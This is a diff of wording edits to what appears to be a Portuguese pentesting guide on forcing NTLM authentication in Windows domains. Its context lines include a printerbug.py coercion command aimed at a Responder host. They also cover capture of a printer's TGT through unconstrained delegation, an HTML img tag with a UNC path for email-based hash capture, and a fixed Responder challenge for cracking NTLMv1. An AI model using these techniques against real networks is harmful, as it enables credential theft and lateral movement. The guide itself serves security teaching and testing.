@@ -41,7 +41,7 @@ printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
 ```
 ### Combinando com Delegação Não Restrita
 
-Se um atacante já comprometeu um computador com [Delegação Não Restrita](unconstrained-delegation.md), o atacante poderia **fazer a impressora se autenticar contra este computador**. Devido à delegação não restrita, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação não restrita. Como o atacante já comprometeu este host, ele poderá **recuperar este ticket** e abusar dele ([Pass the Ticket](pass-the-ticket.md)).
+Se um atacante já comprometeu um computador com [Delegação Não Restrita](unconstrained-delegation.md), o atacante pode **fazer a impressora se autenticar contra este computador**. Devido à delegação não restrita, o **TGT** da **conta de computador da impressora** será **salvo na** **memória** do computador com delegação não restrita. Como o atacante já comprometeu este host, ele poderá **recuperar este ticket** e abusar dele ([Pass the Ticket](pass-the-ticket.md)).
 
 ## Autenticação Forçada RCP
 
@@ -94,7 +94,7 @@ Se você souber o **endereço de email** do usuário que faz login em uma máqui
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-e quando ele o abrir, ele tentará se autenticar.
+e quando ele abrir, ele tentará se autenticar.
 
 ### MitM
 
@@ -104,13 +104,14 @@ Se você puder realizar um ataque MitM a um computador e injetar HTML em uma pá
 ```
 ## Outras maneiras de forçar e phishing de autenticação NTLM
 
+
 {{#ref}}
 ../ntlm/places-to-steal-ntlm-creds.md
 {{#endref}}
 
 ## Quebrando NTLMv1
 
-Se você puder capturar [desafios NTLMv1 leia aqui como quebrá-los](../ntlm/index.html#ntlmv1-attack).\
+Se você conseguir capturar [desafios NTLMv1 leia aqui como quebrá-los](../ntlm/index.html#ntlmv1-attack).\
 _Lembre-se de que para quebrar NTLMv1 você precisa definir o desafio do Responder como "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
